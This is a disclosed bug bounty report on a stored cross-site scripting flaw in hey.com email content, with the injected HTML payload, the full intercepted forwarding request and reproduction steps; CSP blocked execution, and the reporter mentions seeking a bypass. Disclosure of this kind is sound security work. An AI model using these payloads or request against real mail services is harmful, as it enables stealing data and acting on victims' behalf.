# stored XSS in hey.com message content

## Report Details
- **Report ID**: 988272
- **URL**: https://hackerone.com/reports/988272
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-22T15:31:44.005Z
- **Disclosed**: 2020-10-31T06:12:21.638Z

## Reporter
- **Username**: carbon61
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: basecamp

## Vulnerability Information
Hi 
I found a stored xss using ``` message[content] ``` parameter when forwarding an email or saving it as draft ,  and when the victim click on the email to view it, it gets executed .

I used this payload as the message content :
````
From: "f" <[]@hey.com>
To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
Subject: <img src=wczxzx onerror=alert(1)>
Mime-Version: 1.0

    </style>
    </div>
    <svg><![CDATA[><table background="]])><img src=xx:x onerror=alert(2)//"></svg>
    <li style=onesr: src= cxxc=></li>
    style>
</style>
  </head>
<style></style>
  <body>

<svg><![CDATA[><image xlink: src="]]><img src=xx:x onerror=alert(2)//"></svg>
<li style=onerror:jkj/onerror=alert(1); =''ds></li>
    </div>
  </body>
</html>
```

#Note:
 i submitted this stored xss without the CSP bypass just to try not to get a duplicate , i will try to bypass the CSP and let you know.

##Steps To Reproduce:
1- make two accounts and login to the first one 
2- go to any email and forward it to the second email account and intercept the request and change it like this:
```
POST /messages HTTP/1.1
Host: app.hey.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html; page-update, text/html, application/xhtml+xml
Accept-Language: ar,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://app.hey.com/entries/[]/forwards/new
X-CSRF-Token: []
Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
Origin: https://app.hey.com
Content-Length: 1156
DNT: 1
Connection: close


-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="acting_user_id"

{acting_user_id}
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="entry[addressed][directly][]"

[second-email]@hey.com
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[subject]"

Fwd: csdc
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[content]"

From: "f" <[]@hey.com>
To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
Subject: <img src=wczxzx onerror=alert(1)>
Mime-Version: 1.0

    </style>
    </div>
    <svg><![CDATA[><table background="]])><img src=xx:x onerror=alert(2)//"></svg>
    <li style=onesr: src= cxxc=></li>
    style>
</style>
  </head>
<style></style>
  <body>

<svg><![CDATA[><image xlink: src="]]><img src=xx:x onerror=alert(2)//"></svg>
<li style=onerror:jkj/onerror=alert(1); =''ds></li>
    </div>
  </body>
</html>
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="_method"

post
-----------------------------392581797716153644644274802600--

```

3- go to the second email ``` Imbox ``` and click on the email to view it 
4- use the right click on email content to get the devtools and if you view the chrome console you can see the 
```
about:blank:1 Refused to execute inline event handler
 because it violates the following Content Security Policy
 directive: "script-src 'self' https://production.haystack-assets.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.
```

## Impact

using this xss + CSP bypass the attacker can steal data and perform unwanted actions on a victim's behalf.

## Attachments
No attachments
